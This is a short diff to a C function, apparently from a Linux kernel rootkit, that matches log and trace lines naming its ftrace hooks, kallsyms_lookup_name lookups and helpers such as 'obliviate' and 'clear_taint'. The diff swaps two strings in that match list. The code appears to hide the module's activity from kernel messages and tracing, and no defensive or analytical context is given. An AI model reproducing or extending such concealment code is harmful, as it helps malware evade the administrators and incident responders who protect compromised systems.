@@ -282,8 +282,8 @@ notrace static bool line_contains_sensitive_info(const char *line) {
             strstr(line, "hook") != NULL || strstr(line, "hooked_") != NULL ||
             strstr(line, "constprop") != NULL ||
             strstr(line, "kallsyms_lookup_name") != NULL || strstr(line, "obliviate") != NULL ||
-            strstr(line, "clear_taint") != NULL || strstr(line, "filter_buffer") != NULL ||
-            strstr(line, "filter_kmsg") != NULL || strstr(line, "filter_trace") != NULL ||
+            strstr(line, "clear_taint") != NULL || strstr(line, "__builtin__ftrace") != NULL ||
+            strstr(line, "filter_kmsg") != NULL || strstr(line, "create_trampoline+") != NULL ||
             strstr(line, "fh_install") != NULL || strstr(line, "fh_remove") != NULL ||
             strstr(line, "ftrace_helper") != NULL);
 }
